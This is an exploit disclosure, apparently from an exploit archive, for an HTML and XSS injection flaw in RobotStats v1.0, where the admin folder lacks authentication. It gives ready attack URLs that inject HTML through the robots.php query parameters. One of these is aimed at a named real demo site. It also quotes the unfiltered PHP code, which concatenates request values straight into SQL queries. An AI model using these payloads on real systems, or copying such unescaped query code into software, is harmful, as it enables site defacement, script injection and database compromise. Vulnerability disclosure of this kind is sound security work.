# Title         : RobotStats v1.0 HTML Injection Vulnerability
# Author        : ZoRLu / zorlu@milw00rm.com / submit@milw00rm.com
# Home          : http://milw00rm.com / its online
# Twitter	    : https://twitter.com/milw00rm or @milw00rm
# Date          : 22.11.2014
# Demo		    : http://alpesoiseaux.free.fr/robotstats/
# Download 	    : http://www.robotstats.com/en/robotstats.zip
# Thks          : exploit-db.com, packetstormsecurity.com, securityfocus.com, sebug.net and others
# Birkaciyiadam : Dr.Ly0n, KnocKout, LifeSteaLeR, Nicx (harf sirali :)) )

Desc.:
no security for admin folder (session control, login panel or anyone... maybe its different vulnerability)
and no any filter for html code at robots.lib.php. you can inject your html code or xss code.

html inj.:

target.com/robotstats/admin/robots.php?rub=ajouter&nom=<font color=red size=10><body bgcolor=black>NiCKNAME(orwriteyourindexcode)&actif=1&user_agent=writeanything(orhtmlcode)&ip1=&ip2=&detection=detection_user_agent&descr_fr=&descr_en=&url=

after you go here:

target.com/robotstats/info-robot.php?robot=(robot id)

or

target.com/robotstats/admin/robots.php you will see your html page

analysis: (/admin/robots.php)

include "robots.lib.php"; //line 26

else if ($rub == "ajouter")
{
  updateDataBase($robot, $nom, $actif, $user_agent, $ip1, $ip2, $detection, $descr_fr, $descr_en, $url); //line 65 (we will be analysis to robots.lib.php for line)
}

analysis: (/admin/robots.lib.php)

you look code. you will see blank control for "name" and "user agent" but will'nt see any filter for inject (// look line 203 no any filter) no any control or filter for code inject.

function updateDataBase($robot, $nom, $actif, $user_agent, $ip1, $ip2, $detection, $descr_fr, $descr_en, $url)
//line 163 (remember function line 65 in robots.php)
{
  global $RS_LANG, $RS_LANGUE, $RS_TABLE_ROBOTS, $RS_DETECTION_USER_AGENT, $RS_DETECTION_IP;

  // dans tous les cas :
  echo "<p class='normal'><a class='erreur'> ";
  $msg = "";

  // test du nom
  if ($nom == '')  //line 172 control of blank or not blank
  {
    $msg = $RS_LANG["BadRobotName"];
  }

  // test selon le mode de detection
  if ($detection == $RS_DETECTION_USER_AGENT) //line 178 control of your "detection mode" choice
  {
    if ($user_agent == '') //line 180 control of blank or not blank
    {
      $msg = $RS_LANG["BadUserAgent"];
    }
  }
  else if ($detection == $RS_DETECTION_IP)  //line 185 control of your "detection mode" choice
  {
    if ( ($ip1 == '') && ($ip2 == '') )  //line 187 control of your "ip1 and ip2" choice
    {
      $msg = $RS_LANG["IPNotSpecified"];
    }
  }
  else
  {
    $msg = $RS_LANG["BadDetectionMode"];
  }

  if ($msg != "")
  {
    echo $msg;
  }
  else
  {
    $liste_champs  = "nom, actif, user_agent, ip1, ip2, detection, descr_fr, descr_en, url";      // line 203 no any filter
    $liste_valeurs = "\"$nom\", \"$actif\", \"$user_agent\", \"$ip1\", \"$ip2\", \"$detection\", \"$descr_fr\", \"$descr_en\", \"$url\"";
    if ($robot > 0) // cas d'une modification et non d'un ajout       //line 205 control of your choice "wanna update any bot or add new bot"
    {
      $liste_champs  .= ", id";
      $liste_valeurs .= ", '$robot'";
      $sql = "REPLACE INTO ".$RS_TABLE_ROBOTS." ($liste_champs) VALUES ($liste_valeurs)";
      $res = mysql_query($sql) or erreurServeurMySQL($sql);
      echo $RS_LANG["RobotUpdated"];
    }
    else
    {
      $sql = "INSERT INTO ".$RS_TABLE_ROBOTS." ($liste_champs) VALUES ($liste_valeurs)";
      $res = mysql_query($sql) or erreurServeurMySQL($sql);
      echo $RS_LANG["RobotAdded"];
    }
  }

for demo:

http://alpesoiseaux.free.fr/robotstats/admin/robots.php?rub=ajouter&nom=<font color=red size=10><body bgcolor=black>NiCKNAME&actif=1&user_agent=writeanything(orhtmlcode)&ip1=&ip2=&detection=detection_user_agent&descr_fr=&descr_en=&url=

after you go here:

http://alpesoiseaux.free.fr/robotstats/info-robot.php?robot=(robot id)

or 

http://alpesoiseaux.free.fr/robotstats/admin/robots.php

you will see your html page